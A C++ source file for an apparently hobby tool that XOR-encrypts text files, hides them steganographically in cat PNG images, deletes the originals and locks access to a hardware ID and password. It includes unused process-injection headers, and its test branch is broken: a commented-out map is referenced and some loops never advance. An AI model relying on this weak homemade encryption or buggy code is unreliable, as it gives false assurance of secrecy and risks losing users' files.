#include <string>
#include <iostream>
#include "filesystem.h"
#include <wininet.h>
#include <string>
#include <vector>
#include <fstream>
#include "lodepng/lodepng.h"
#include <uchar.h>
#include<list>
#include <bitset>
#include <map>
#include <filesystem>
#include "injector/injection.h"
#include "hwid.h"
#include "binarymp3/yuumitrashtalk.h"
#include "stb_image.h"
#include "playbinarymp3files.h"

#pragma comment(lib,"Wininet.lib")

typedef unsigned int uint;
typedef unsigned char uchar;

struct pxl_values
{
	int pxl_one;
	int pxl_two;
	int pxl_three;

	constexpr pxl_values(int _pxl_one, int _pxl_two, int _pxl_three)
	{

		pxl_one = _pxl_one;
		pxl_two = _pxl_two;
		pxl_three = _pxl_three;
	}
};

bool checkInternetConn();
int* readPng(const std::string path, uint& width, uint& height);
void writeEncryptPng(const uint width, const uint height, const int* const png_data, std::map<int, std::map<int, pxl_values>> map_of_map, std::list<std::string> file_names, std::list<std::string>::iterator current_file_name);
std::map<int, std::map<int, pxl_values>> parseEncryptString(std::string encrypted_str, std::list<std::string> file_names, std::list<std::string>::iterator current_file_name);
void writeEncryptPngOnePage(const uint width, const uint height, const int* const png_data, std::map<int, pxl_values> map, std::string path);
std::map<std::string, std::string> imageParseNew(std::string path, uint with, uint height);
bool detectFakePng(const std::string path, uint& width, uint& height);
void spamCats(int n, int* png);
void writeToTxt(std::string data, std::string path);
void initialize();
bool checkEncryptExist();
void writeFakePng(const std::string path, const uint width, const uint height, const int* const data);
void securityCatCaller();
std::string convertASCII(std::string str, int len);
std::string currentDirectory();
std::string getTxtData(std::string path);
std::string catRandomizer();
std::list<std::string> catRandomizerMulti(int n);
std::list<std::string> listAllFiles(std::string path);
std::list<std::string> listPngFilesMsg(std::list<std::string> li);
std::list<std::string> listPngFilesAll();
std::list<std::string> listTxtFilesAll();
std::map<int, pxl_values> parseString(std::string string);
std::map<std::string, std::string> imageParseNew(std::string path, uint with, uint height);
int GetPIDByName(const char* ProcName);
HANDLE OpenProc(const char* ProcName);
std::string xorEncryptDecrypt(char inpString[], std::string xorKey);


std::list<std::string> cats = {"cat.png"};
std::list<std::string> verbs = {"cute", "cutie", "lulu", "walking", "lmao", "sneeze", "teach", "play", "kiss", "cry", "think", "evolve", "yasmine", "moana", "sleepy"};
std::list<std::string> encry_msgs = {};
/*
std::map<std::string, int> map_YSCII
{
	{ "	", 41 },
	{ "☻", 214 },
	{ "♥", 235 },
	{ "♦", 44 },
	{ "♣", 169 },
	{ "♠", 3 },
	{ "	", 239 },
	{ "♂", 76 },
	{ "♀", 252 },
	{ "♫", 236 },
	{ "☼", 190 },
	{ "►", 212 },
	{ "◄", 237 },
	{ "↕", 81 },
	{ "‼", 6 },
	{ "¶", 69 },
	{ "§", 77 },
	{ "▬", 153 },
	{ "↨", 37 },
	{ "↑", 142 },
	{ "↓", 101 },
	{ "→", 83 },
	{ "∟", 92 },
	{ "↔", 51 },
	{ "▲", 63 },
	{ "▼", 84 },
	{ " ", 22 },
	{ "!", 167 },
	{ "\"", 34},
	{ "#", 205 },
	{ "$", 204 },
	{ "%", 143 },
	{ "&", 96 },
	{ "'", 243 },
	{ "(", 78 },
	{ ")", 74 },
	{ "*", 61 },
	{ "+", 203 },
	{ ",", 238 },
	{ "-", 47 },
	{ ".", 104 },
	{ "/", 117 },
	{ "0", 147 },
	{ "1", 109 },
	{ "2", 53 },
	{ "3", 244 },
	{ "4", 13 },
	{ "5", 230 },
	{ "6", 57 },
	{ "7", 115 },
	{ "8", 17 },
	{ "9", 139 },
	{ ":", 208 },
	{ ";", 161 },
	{ "<", 90 },
	{ "=", 80 },
	{ ">", 99 },
	{ "?", 145 },
	{ "@", 50 },
	{ "A", 216 },
	{ "B", 246 },
	{ "C", 168 },
	{ "D", 233 },
	{ "E", 249 },
	{ "F", 128 },
	{ "G", 114 },
	{ "H", 64 },
	{ "I", 141 },
	{ "J", 110 },
	{ "K", 121 },
	{ "L", 43 },
	{ "M", 54 },
	{ "N", 146 },
	{ "O", 103 },
	{ "P", 182 },
	{ "Q", 118 },
	{ "R", 42 },
	{ "S", 234 },
	{ "T", 221 },
	{ "U", 49 },
	{ "V", 9 },
	{ "W", 240 },
	{ "X", 207 },
	{ "Y", 11 },
	{ "Z", 201 },
	{ "[", 176 },
	{ "\"", 185 },
	{ "]", 149 },
	{ "^", 202 },
	{ "_", 150 },
	{ "`", 219 },
	{ "a", 2 },
	{ "b", 18 },
	{ "c", 192 },
	{ "d", 30 },
	{ "e", 21 },
	{ "f", 170 },
	{ "g", 32 },
	{ "h", 195 },
	{ "i", 19 },
	{ "j", 206 },
	{ "k", 67 },
	{ "l", 65 },
	{ "m", 130 },
	{ "n", 111 },
	{ "o", 196 },
	{ "p", 157 },
	{ "q", 213 },
	{ "r", 183 },
	{ "s", 155 },
	{ "t", 79 },
	{ "u", 68 },
	{ "v", 251 },
	{ "w", 228 },
	{ "x", 211 },
	{ "y", 25 },
	{ "z", 93 },
	{ "{", 98 },
	{ "|", 135 },
	{ "}", 125 },
	{ "~", 70 },
	{ "⌂", 137 },
	{ "Ç", 108 },
	{ "ü", 55 },
	{ "é", 91 },
	{ "â", 194 },
	{ "ä", 4 },
	{ "à", 144 },
	{ "å", 15 },
	{ "ç", 218 },
	{ "ê", 158 },
	{ "ë", 126 },
	{ "è", 242 },
	{ "ï", 29 },
	{ "î", 200 },
	{ "ì", 199 },
	{ "Ä", 191 },
	{ "Å", 224 },
	{ "É", 62 },
	{ "æ", 85 },
	{ "Æ", 178 },
	{ "ô", 210 },
	{ "ö", 198 },
	{ "ò", 180 },
	{ "û", 8 },
	{ "ù", 209 },
	{ "ÿ", 127 },
	{ "Ö", 72 },
	{ "Ü", 162 },
	{ "ø", 52 },
	{ "£", 173 },
	{ "Ø", 71 },
	{ "×", 193 },
	{ "ƒ", 31 },
	{ "á", 36 },
	{ "í", 165 },
	{ "ó", 97 },
	{ "ú", 129 },
	{ "ñ", 123 },
	{ "Ñ", 122 },
	{ "ª", 89 },
	{ "º", 171 },
	{ "¿", 164 },
	{ "®", 215 },
	{ "¬", 94 },
	{ "½", 58 },
	{ "¼", 86 },
	{ "¡", 73 },
	{ "«", 132 },
	{ "»", 100 },
	{ "░", 119 },
	{ "▒", 229 },
	{ "▓", 46 },
	{ "│", 241 },
	{ "┤", 112 },
	{ "Á", 231 },
	{ "Â", 245 },
	{ "À", 40 },
	{ "©", 217 },
	{ "╣", 226 },
	{ "║", 23 },
	{ "╗", 75 },
	{ "╝", 163 },
	{ "¢", 35 },
	{ "¥", 186 },
	{ "┐", 59 },
	{ "└", 27 },
	{ "┴", 174 },
	{ "┬", 134 },
	{ "├", 181 },
	{ "─", 227 },
	{ "┼", 248 },
	{ "ã", 172 },
	{ "Ã", 14 },
	{ "╚", 20 },
	{ "╔", 247 },
	{ "╩", 140 },
	{ "╦", 232 },
	{ "╠", 56 },
	{ "═", 156 },
	{ "╬", 148 },
	{ "¤", 26 },
	{ "ð", 250 },
	{ "Ð", 179 },
	{ "Ê", 88 },
	{ "Ë", 136 },
	{ "È", 253 },
	{ "ı", 159 },
	{ "Í", 24 },
	{ "Î", 1 },
	{ "Ï", 116 },
	{ "┘", 82 },
	{ "┌", 45 },
	{ "█", 48 },
	{ "▄", 10 },
	{ "¦", 102 },
	{ "Ì", 166 },
	{ "▀", 177 },
	{ "Ó", 12 },
	{ "ß", 66 },
	{ "Ô", 154 },
	{ "Ò", 222 },
	{ "õ", 184 },
	{ "Õ", 7 },
	{ "µ", 188 },
	{ "þ", 160 },
	{ "Þ", 39 },
	{ "Ú", 133 },
	{ "Û", 220 },
	{ "Ù", 120 },
	{ "ý", 38 },
	{ "Ý", 223 },
	{ "¯", 189 },
	{ "´", 60 },
	{ "­", 152 },
	{ "±", 28 },
	{ "‗", 138 },
	{ "¾", 113 },
	{ "¶", 105 },
	{ "§", 106 },
	{ "÷", 254 },
	{ "¸", 225 },
	{ "°", 197 },
	{ "¨", 124 },
	{ "·", 151 },
	{ "¹", 87 },
	{ "³", 0 },
	{ "²", 175 },
	{ "■", 131 }
};
*/
uint width = 2999;
uint height = 1877;


int main()
{
	
	srand(time(NULL));
	initialize();
	if (checkEncryptExist() == true)
	{
		//WE DECRYPT
		std::string key_entered;
		std::cout << "ENCRYPTION DETECTED" << std::endl << "ENTER KEY: ";
		std::map<std::string, std::string> map_tmp;
		map_tmp = imageParseNew("yasminicat375.png", width, height);

		int key_len_map = map_tmp.at("encrypted_msg").length();
		std::string key_local = convertASCII(map_tmp.at("encrypted_msg"), key_len_map);
		std::cin >> key_entered;
		if (key_entered != key_local)
		{
			securityCatCaller();
		}

		std::list<std::string> png_li_all;
		std::list<std::string> png_li_msg;

		png_li_all = listPngFilesAll();
		png_li_msg = listPngFilesMsg(png_li_all);

		for (std::list<std::string>::iterator it = png_li_msg.begin(); it != png_li_msg.end();)
		{
			std::map<std::string, std::string> map_tmp;
			map_tmp = imageParseNew(*it, width, height);
			int len_tmp = map_tmp.at("encrypted_msg").length();
			std::string msg = xorEncryptDecrypt(convertASCII(map_tmp.at("encrypted_msg"), len_tmp).data(), key_local);
			writeToTxt(msg, std::string(std::to_string(rand() % 1000000)) + ".txt");
			std::remove(std::string(*it).c_str());
			it++;
		}
		std::remove("yasminicat375.png");
		std::remove("cat.png");
		std::cout << "FINISHED" << std::endl;
		std::cout << "-----------------------" << std::endl << std::endl;
		return EXIT_SUCCESS;
	}
	
	if (checkEncryptExist() == false)
	{
		//WE HAVE TO ENCRYPT
		int* png = readPng("cryingcat.png", width, height);
		std::string key_entered;
		std::cout << "DRAG TXT FILES TO STICK: " << std::endl;

		while (listTxtFilesAll().size() == 0)
		{
			Sleep(5000);
		}
		std::cout << "FILES DETECTED" << std::endl << std::endl;
		std::cout << "PICK SECRET KEY: ";
		std::cin >> key_entered;

		std::map<int, pxl_values> key_map_tmp;
		key_map_tmp = parseString(key_entered);

		writeEncryptPngOnePage(width, height, png, key_map_tmp, "yasminicat375.png");

		std::map<int, pxl_values> txt_map_tmp;
		std::list<std::string> txt_li_all = listTxtFilesAll();
		for (std::list<std::string>::iterator it = txt_li_all.begin(); it != txt_li_all.end();)
		{
			txt_map_tmp = parseString(xorEncryptDecrypt(getTxtData(*it).data(), key_entered));
			writeEncryptPngOnePage(width, height, png, txt_map_tmp, catRandomizer());
			std::remove(std::string(*it).c_str());
			it++;
		}
		spamCats(10, png);
		writeFakePng("cat.png", width, height, png);
		std::cout << "FINISHED" << std::endl;
		std::cout << "-----------------------" << std::endl << std::endl;
		std::cout << "UNPLUG NOW" << std::endl;
	}
	return EXIT_SUCCESS;
}

bool checkInternetConn()
{
	LPCSTR url = "http://www.google.com";
	bool bConnect = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);
	if (bConnect)
	{
		return true; // INTERNET CONN EXIST
	}
	else
	{
		return false; // INTERNET DOES NOT EXIST
	}
	return false;
}

void initialize()
{
#ifdef TEST
	
	if (checkInternetConn() == true)
	{
		MessageBoxA(NULL, "Disconnect from Internet", "Error", MB_OK | MB_ICONERROR);
		TerminateProcess(GetCurrentProcess(), 0xBABEFACE);
		return;
	}
	
	std::string hwid = getHWID();

	if (!files->fileExists("cutieecat.png"))
	{
		int* png = readPng("cryingcat.png", width, height);

		std::map<int, std::map<int, pxl_values>> map_of_map;
		std::list<std::string> safe_to_file;
		safe_to_file.push_back("cutieecat.png");
		std::list<std::string>::iterator find_file = std::find(safe_to_file.begin(), safe_to_file.end(), "cutieecat.png");
		map_of_map = parseEncryptString(hwid, safe_to_file, find_file);
		writeEncryptPng(width, height, png, map_of_map, safe_to_file, find_file);
	}

	int* pngHWID = readPng("cutieecat.png", width, height);
	std::map<std::string, std::string> hwid_local_map;
	hwid_local_map = imageParseNew("cutieecat.png", width, height);
	std::string hwid_local = hwid_local_map.at("encrypted_msg");

	std::cout << "hwid: " << hwid << std::endl;
	std::cout << "hwid local: " << hwid_local << std::endl;

	/*
	if (hwid_local != hwid)
	{
		
			ENCRYPT ALL FILES
		

		MessageBoxA(NULL, "Get fuckeed btich", "Error", MB_OK | MB_ICONERROR);
		TerminateProcess(GetCurrentProcess(), 0xBABEFACE);
		return;
	}*/
	return;
#endif TEST

#ifndef TEST
	/*
	if (checkInternetConn() == true)
	{
		MessageBoxA(NULL, "Disconnect from Internet", "Error", MB_OK | MB_ICONERROR);
		TerminateProcess(GetCurrentProcess(), 0xBABEFACE);
		return;
	}*/
	
	std::string hwid = hwid::getHWID();

	if (!files->fileExists("cutieecat133.png"))
	{
		std::map<int, pxl_values> hwid_map_tmp;
		int* png = readPng("cryingcat.png", width, height);
		hwid_map_tmp = parseString(hwid);
		writeEncryptPngOnePage(width, height, png, hwid_map_tmp, "cutieecat133.png");
	}
	std::map<std::string, std::string> temp_res;
	temp_res = imageParseNew("cutieecat133.png", width, height);

	int hwid_len_tmp = temp_res.at("encrypted_msg").length();
	std::string hwid_local = convertASCII(temp_res.at("encrypted_msg"), hwid_len_tmp);

	if (hwid_local != hwid)
	{
		securityCatCaller();
	}

	std::string password_local;
	std::string password_entered;

	if (files->fileExists("thinkingcat980.png"))
	{
		std::map<std::string, std::string> pasmap_tmp;
		int len;
		std::cout << "ENTER PASSWORD: ";
		std::cin >> password_entered;
		pasmap_tmp = imageParseNew("thinkingcat980.png", width, height);
		std::string string_tmp = pasmap_tmp.at("encrypted_msg");
		password_local = convertASCII(pasmap_tmp.at("encrypted_msg"), string_tmp.length());
		std::cin.get();
		if (password_entered != password_local)
		{
			securityCatCaller();
		}
	}
	if (!files->fileExists("thinkingcat980.png"))
	{
		std::cout << "ENTER YOUR NEW PASSWORD: ";
		std::cin >> password_entered;
		std::map<int, pxl_values> pass_map_tmp;
		int* png = readPng("cryingcat.png", width, height);
		pass_map_tmp = parseString(password_entered);
		writeEncryptPngOnePage(width, height, png, pass_map_tmp, "thinkingcat980.png");
		std::cout << "PASSWORD SAVED" << std::endl << std::endl;
	}

	std::cout << "SUCCESSFULLY Identified" << std::endl;
	std::cout << "-----------------------" << std::endl << std::endl;
	return;
#endif

}


void spamCats(int n, int* png)
{
	catRandomizerMulti(n);

	for (const auto& cat : cats)
	{
		writeFakePng(cat, width, height, png);
	}
}

std::list<std::string> catRandomizerMulti(int n)
{
	int i = 0;
	std::list<std::string> li_tmp;
	while (i  < n)
	{
		for (const auto& verb : verbs)
		{
			li_tmp.push_back(verb + "cat" + std::to_string(rand() % 1000) + ".png");
		}
		i++;
	}
	return li_tmp;
}

std::string catRandomizer()
{
	int random_cat_it = rand() % verbs.size();
	int i = 0;
	for (const auto& verb : verbs)
	{
		if (i == random_cat_it)
		{
			return std::string(verb + "cat" + std::to_string(rand() % 1000) + ".png");
		}
		i++;
	}
}

int* readPng(const std::string path, uint& width, uint& height)
{
	std::vector<uchar> img;
	lodepng::decode(img, width, height, path, LCT_RGB);
	int* data = new int[width * height];
	for (uint i = 0; i < width * height; i++)
	{
		data[i] = img[3 * i] << 16 | img[3 * i + 1] << 8 | img[3 * i + 2];
	}
	return data;
}

void writeFakePng(const std::string path, const uint width, const uint height, const int* const data)
{
	uchar* img = new uchar[3 * width * height];
	for (uint i = 0; i < width * height; i++)
	{
		const int color = data[i];
		img[3 * i] = (color >> 16) & 255;
		img[3 * i + 1] = (color >> 8) & 255;
		img[3 * i + 2] = color & 255;

		if (i == 0 || i == 1)
		{
			img[3 * i] = 255;
			img[3 * i + 1] = 255;
			img[3 * i + 2] = 255;
		}
	}
	lodepng::encode(path, img, width, height, LCT_RGB);
	delete[] img;
}




#ifndef TEST

/*
*
*
*
*	WE UTILIZE ASCII TO READ AND WRITE DATA
*
*
*/

void writeEncryptPngOnePage(const uint width, const uint height, const int* const png_data, std::map<int, pxl_values> map, std::string path)
{
	uchar* img = new uchar[3 * width * height];
	int k{ 1 };

	for (uint i = 0; i < width * height; i++)
	{
		const int color = png_data[i];
		if (i <= width && i < map.size())
		{
			std::map<int, pxl_values>::iterator it;

			it = map.find(i);
			img[3 * i] = it->second.pxl_one;
			img[3 * i + 1] = it->second.pxl_two;
			img[3 * i + 2] = it->second.pxl_three;
		}
		else
		{
			img[3 * i] = (color >> 16) & 255;
			img[3 * i + 1] = (color >> 8) & 255;
			img[3 * i + 2] = color & 255;
		}
	}
	lodepng::encode(path, img, width, height, LCT_RGB);	// *it is the output path
	delete[] img;
}


std::map<int, pxl_values> parseString(std::string string)
{
	std::map<int, pxl_values> map;
	int element_1;
	int element_2;
	int element_3;
	int k = 0;
	int k_tmp;
	for (int i = 0; i < string.length();)
	{
		element_1 = int(string[i]);
		element_2 = int(string[i + 1]);
		element_3 = int(string[i + 2]);
		i = i + 3;
		map.insert({ k, pxl_values(element_1, element_2, element_3) });
		k++;
		k_tmp = k;
	}
	map.insert({ k_tmp, pxl_values(255, 255, 255) });
	return map;
}

std::map<std::string, std::string> imageParseNew(std::string path, uint with, uint height)
{
	std::vector<uchar> img;
	lodepng::decode(img, width, height, path, LCT_RGB);
	int* data = new int[width * height];

	std::string encrypted_msg;
	std::string new_path_to_read;

	std::map<std::string, std::string> map_return;

	for (uint i = 0; i < width * height; i++)
	{
		data[i] = img[3 * i] << 16 | img[3 * i + 1] << 8 | img[3 * i + 2];
	}
	for (uint i = 0; i < width; i++)
	{

		int color = data[i];
		int amount_of_stops{ 0 };

		if ((((color >> 16) & 255) != 255))
		{
			encrypted_msg.append(std::to_string(char((color >> 16) & 255)));
		}
		else {
			map_return.insert({ "encrypted_msg", encrypted_msg });
			return map_return;
		}


		if ((((color >> 8) & 255) != 255))
		{
			encrypted_msg.append(std::to_string(char((color >> 8) & 255)));

		}
		else {
			map_return.insert({ "encrypted_msg", encrypted_msg });
			return map_return;
		}

		if (((color & 255) != 255))
		{
			encrypted_msg.append(std::to_string(char(color & 255)));
		}
		else {
			map_return.insert({ "encrypted_msg", encrypted_msg });
			return map_return;
		}
	}
	map_return.insert({ "encrypted_msg", encrypted_msg });
	return map_return;
}



std::string convertASCII(std::string str, int len)
{
	std::string string;
	int num = 0;
	for (int i = 0; i < len; i++)
	{
		num = num * 10 + (str[i] - '0');
		if (num >= 32 && num <= 122)
		{
			char ch = (char)num;
			string = string + (ch);
			num = 0;
		}
	}
	return string;
}
#endif


#ifdef TEST

/*
*
*
*
*	WE UTILIZE YSCII TO READ AND WRITE DATA
*	MULTI TXT SUPPORT
*
*
*/

bool checkIfDivideIsEnough(std::string encrypted_str)
{
	int possible_storage = 1240;

	int txt_length = encrypted_str.length();
	for (int j = 1; j < encrypted_str.length(); j++)
	{
		if (possible_storage * j > encrypted_str.length())
		{
			if (j > 1)	//WE NEED MORE THAN ONE PAGE
			{
				return false;
			}
		}
	}
	return true;
}

std::map<int, std::map<int, pxl_values>> parseEncryptString(std::string encrypted_str, std::list<std::string> file_names, std::list<std::string>::iterator current_file_name)
{
	int possible_storage = 1240;
	int png_amount{};
	int real_storage = possible_storage / encrypted_str.length();
	bool problem = false;
	int divider{};

	std::map<int, std::string> encrypted_strings_map;

	for (int j = 1; j < encrypted_str.length(); j++)
	{
		if (possible_storage * j > encrypted_str.length())
		{
			png_amount = j;
			if (j > 1)			//WE NEED MORE THAN ONE PAGE
			{
				problem = true;
			}
			break;
		}
	}

	if (problem)
	{
		std::string encrypted_str_tmp{};

		for (int j = 2; j < encrypted_str.length(); j++)
		{
			encrypted_str_tmp = encrypted_str.substr(0, encrypted_str.length() / j);
			if (checkIfDivideIsEnough(encrypted_str_tmp))		//get amount of divider
			{
				divider = j;
				break;
			}
		}

		int storage_we_need = encrypted_str.length() / divider;
		for (int i = 0; i < divider; i++)
		{
			encrypted_strings_map.insert({ i, encrypted_str.substr(storage_we_need * i, i != 0 ? (storage_we_need * i) + storage_we_need : storage_we_need) });
		}
	}



	std::map<int, pxl_values> txt_pxl_map;
	std::map<int, std::map<int, pxl_values>> map_of_pxl_map;

	int k = 0;
	int j = 0;
	int element_1 = 0;
	int element_2 = 0;
	int element_3 = 0;
	if (problem)
	{
		for (auto element_encr_strings = encrypted_strings_map.begin(); element_encr_strings != encrypted_strings_map.end(); element_encr_strings++)
		{
			for (int i = 0; i < element_encr_strings->second.length(); i + 3)
			{
				element_1 = 255;
				element_2 = 255;
				element_3 = 255;
				for (auto element_YSCII = map_YSCII.begin(); element_YSCII != map_YSCII.end(); element_YSCII++)
				{
					if (i >= element_encr_strings->second.length())
					{
						element_1 = 107;
					}
					else
					{
						if (std::to_string(element_encr_strings->second[i]) == element_YSCII->first)
						{
							element_1 = element_YSCII->second;
						}
					}

					if (i + 1  >= element_encr_strings->second.length())
					{
						element_2 = 107;
					}
					else
					{
						if (std::to_string(element_encr_strings->second[i + 1]) == element_YSCII->first)
						{
							element_2 = element_YSCII->second;
						}
					}

					if (i + 2 >= element_encr_strings->second.length())
					{
						element_3 = 107;
					}
					else
					{
						if (std::to_string(element_encr_strings->second[i + 2]) == element_YSCII->first)
						{
							element_3 = element_YSCII->second;
						}
					}
				}
				txt_pxl_map.insert({ k, pxl_values(element_1, element_2, element_3) });

				/*
				*
				* 
				* IF ENCRYPTION STRING IS AT HIS END WE ENTER THE FILE NAME
				* 
				* 
				*/
				if (i == element_encr_strings->second.length())
				{
					txt_pxl_map.insert({ k + 1, pxl_values(255, 255, 255) });
					/*
					std::list<std::string>::iterator it = file_names.begin();
					std::advance(it, current_file_name + 1);
					*/
					std::string file_name = *current_file_name;
					int counter_tmp{ 1 };
					for (int file_name_traverse_tmp = 0; file_name_traverse_tmp < file_name.length(); file_name_traverse_tmp + 3)
					{
						if (file_name_traverse_tmp >= file_name.length())
						{
							element_1 = 107;
						}
						else
						{
							element_1 = file_name[file_name_traverse_tmp];
						}

						if (file_name_traverse_tmp + 1 >= file_name.length())
						{ 
							element_2 = 107;
						}
						else
						{
							element_2 = file_name[file_name_traverse_tmp + 1];
						}

						if (file_name_traverse_tmp + 2 >= file_name.length())
						{
							element_3 = 107;
						}
						else
						{
							element_3 = file_name[file_name_traverse_tmp + 2];
						}

						txt_pxl_map.insert({ k + (1 + counter_tmp), pxl_values(element_1, element_2, element_3)});
						counter_tmp++;
					}
				}
				k++;
			}
			//write map to map
			map_of_pxl_map.insert({ j, txt_pxl_map });
			j++;
		}
	}
	else
	{
		for (int i = 0; i < encrypted_str.length();)
		{
			element_1 = 255;
			element_2 = 255;
			element_3 = 255;
			for (auto const& [key, val] : map_YSCII)
			{

				if (i >= encrypted_str.length())
				{
					element_1 = 107;
				}
				else
				{
					if (std::to_string(encrypted_str[i]) == std::string(key))
					{
						element_1 = val;
					}
				}

				if (i + 1 >= encrypted_str.length())
				{
					element_2 = 107;
				}
				else
				{
					if (std::to_string(encrypted_str[i + 1]) == std::string(key))
					{
						element_2 = val;
					}
				}
				
				if (i + 2 >= encrypted_str.length())
				{
					element_3 = 107;
				}
				else
				{
					if (std::to_string(encrypted_str[i + 2]) == std::string(key))
					{
						element_3 = val;
					}
				}

			}
			txt_pxl_map.insert({ k, pxl_values(element_1, element_2, element_3) });
			if (i == encrypted_str.length())
			{
				txt_pxl_map.insert({ k + 1, pxl_values(255, 255, 255) });
			}
			k++;
			i = i + 3;
		}
		map_of_pxl_map.insert({ j, txt_pxl_map });
	}

	return map_of_pxl_map;
}

void writeEncryptPng(const uint width, const uint height, const int* const png_data, std::map<int, std::map<int, pxl_values>> map_of_map, std::list<std::string> file_names, std::list<std::string>::iterator current_file_name)
{
	uchar* img = new uchar[3 * width * height];
	int k{ 1 };
	for (auto map = map_of_map.begin(); map != map_of_map.end(); map++)
	{
		for (uint i = 0; i < width * height; i++)
		{
			const int color = png_data[i];
			if (i <= width && i < map->second.size())
			{
				std::map<int, pxl_values>::iterator it;

				it = map->second.find(i);
				img[3 * i] = it->second.pxl_one;
				img[3 * i + 1] = it->second.pxl_two;
				img[3 * i + 2] = it->second.pxl_three;
			}
			else
			{
				img[3 * i] = (color >> 16) & 255;
				img[3 * i + 1] = (color >> 8) & 255;
				img[3 * i + 2] = color & 255;
			}
		}
		/*
		std::list<std::string>::iterator it = file_names.begin();
		std::advance(it, current_file_name + k);
		*/
		lodepng::encode(*current_file_name, img, width, height, LCT_RGB);	// *it is the output path
		delete[] img;
		k++;
	}
	/*
	for (uint i = 0; i < width * height; i++)
	{
		const int color = png_data[i];
		if (i <= width && i <= txt_map.size())
		{
			std::map<int, pxl_values>::iterator it;

			it = txt_map.find(i);

			img[3 * i] = it->second.pxl_one;
			img[3 * i + 1] = it->second.pxl_two;
			img[3 * i + 2] = it->second.pxl_three;
		}
		else
		{
			img[3 * i] = (color >> 16) & 255;
			img[3 * i + 1] = (color >> 8) & 255;
			img[3 * i + 2] = color & 255;
		}
	}
	std::list<std::string>::iterator it = file_names.begin();
	std::advance(it, current_file_name + 1);
	lodepng::encode(output_path, img, width, height, LCT_RGB);
	delete[] img;
	*/
}

/*
* 
* 
* 
*	WE WANT TO READ PIXELS FROM AN IMAGE TO DETECT HIDDEN MSGS 
* 
* 
*	TODO
*/

std::map<std::string, std::string> imageParseNew(std::string path, uint with, uint height)
{
	std::vector<uchar> img;
	lodepng::decode(img, width, height, path, LCT_RGB);
	int* data = new int[width * height];

	std::string encrypted_msg;
	std::string new_path_to_read;

	std::map<std::string, std::string> map_return;

	for (uint i = 0; i < width * height; i++)
	{
		data[i] = img[3 * i] << 16 | img[3 * i + 1] << 8 | img[3 * i + 2];
	}
	for (uint i = 0; i < width; i++)
	{

		int color = data[i];
		int amount_of_stops{0};
		
		//765 loops for three characters
		// 255 for one
		for (auto const& [key, val] : map_YSCII)
		{
			if (((color >> 16) & 255) == val)
			{
				if (amount_of_stops == 2)
				{
					if (new_path_to_read.find(".png") != std::string::npos)
					{
						map_return.insert({ "encrypted_msg", encrypted_msg });
						map_return.insert({ "new_path", new_path_to_read });
						return map_return;
					}
					new_path_to_read.append(key);
				}
				else
				{
					encrypted_msg.append(key);
				}

				if (((color >> 16) & 255) == 255)
				{
					amount_of_stops =+ 1;
				}
			}
		}
		for (auto const& [key, val] : map_YSCII)
		{
			if (((color >> 8) & 255) == val)
			{
				if (amount_of_stops == 2)
				{
					if (new_path_to_read.find(".png") != std::string::npos)
					{
						map_return.insert({ "encrypted_msg", encrypted_msg });
						map_return.insert({ "new_path", new_path_to_read });
						return map_return;
					}
					new_path_to_read.append(key);
				}
				else
				{
					encrypted_msg.append(key);
				}

				if (((color >> 16) & 255) == 255)
				{
					amount_of_stops =+ 1;
				}
			}
		}
		for (auto const& [key, val] : map_YSCII)
		{
			if ((color & 255) == val)
			{
				if (amount_of_stops == 2)
				{
					if (new_path_to_read.find(".png") != std::string::npos)
					{
						map_return.insert({ "encrypted_msg", encrypted_msg });
						map_return.insert({ "new_path", new_path_to_read });
						return map_return;
					}
					new_path_to_read.append(key);
				}
				else
				{
					encrypted_msg.append(key);
				}

				if (((color >> 16) & 255) == 255)
				{
					amount_of_stops =+ 1;
				}
			}
		}
	}
	map_return.insert({ "encrypted_msg", encrypted_msg });
	return map_return;
}

#endif TEST


bool detectFakePng(const std::string path, uint& width, uint& height)
{
	std::vector<uchar> img;
	lodepng::decode(img, width, height, path, LCT_RGB);
	int* data = new int[width * height];
	for (uint i = 0; i < width * height; i++)
	{
		data[i] = img[3 * i] << 16 | img[3 * i + 1] << 8 | img[3 * i + 2];
	}
	const int color_1 = data[0];
	const int color_2 = data[1];
	if (((color_1 >> 16) & 255) == 255 && ((color_1 >> 8) & 255) == 255 && (color_1 & 255) == 255)
	{
		if (((color_2 >> 16) & 255) == 255 && ((color_2 >> 8) & 255) == 255 && (color_2 & 255) == 255)
		{
			return true;
		}
	}
	return false;
}


std::string stringToBinaryString(std::string x)
{
	std::string binaryString;
	for (char& _char : x)
	{
		binaryString += std::bitset<8>(_char).to_string();
	}

	return binaryString;
}

bool checkEncryptExist()
{
	if (files->fileExists("cat.png"))
	{
		return true;
	}
	return false;
}

std::list<std::string> listAllFiles(std::string path)
{
	std::list<std::string> all_files_li;
	for (const auto& entry : std::filesystem::directory_iterator(path))
	{
		all_files_li.push_back((entry.path().string()));
	}
	return all_files_li;
}

std::string currentDirectory()
{
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	char current_directory[1000];
	strcpy_s(current_directory, std::string(buffer).substr(0, std::string(buffer).find_last_of("\\/") + 1).c_str());
	return std::string(current_directory);
}

std::list<std::string> listPngFilesAll()
{
	std::list<std::string> files_all;
	std::list<std::string> files_png;

	files_all = listAllFiles(currentDirectory());

	for (std::list<std::string>::iterator it = files_all.begin(); it != files_all.end();)
	{
		std::string x = std::string(*it);
		if (x.find(".png") != std::string::npos)
		{
			files_png.push_back(*it);
		}
		if (it != files_all.end())
		{
			it++;
		}
	}
	return files_png;
}

std::list<std::string> listTxtFilesAll()
{
	std::list<std::string> files_all;
	std::list<std::string> files_png;

	files_all = listAllFiles(currentDirectory());

	for (std::list<std::string>::iterator it = files_all.begin(); it != files_all.end();)
	{
		std::string x = std::string(*it);
		if (!(x.find("thinkingcat980.png") != std::string::npos) && !(x.find("cutieecat133.png") != std::string::npos) && !(x.find("yasminicat375.png") != std::string::npos) && !(x.find("cryingcat.png") != std::string::npos) && !(x.find("cat.png") != std::string::npos) && !(x.find("mycutecat.png") != std::string::npos) && !(x.find("sneezingcat641.png") != std::string::npos))
		{
			files_png.push_back(*it);
		}
		if (it != files_all.end())
		{
			it++;
		}
	}
	return files_png;
}


std::list<std::string> listPngFilesMsg(std::list<std::string> li)
{
	std::list<std::string> li_return;
	for (std::list<std::string>::iterator it = li.begin(); it != li.end();)
	{
		std::string x = std::string(*it);
		if (x.find(".png") != std::string::npos)
		{
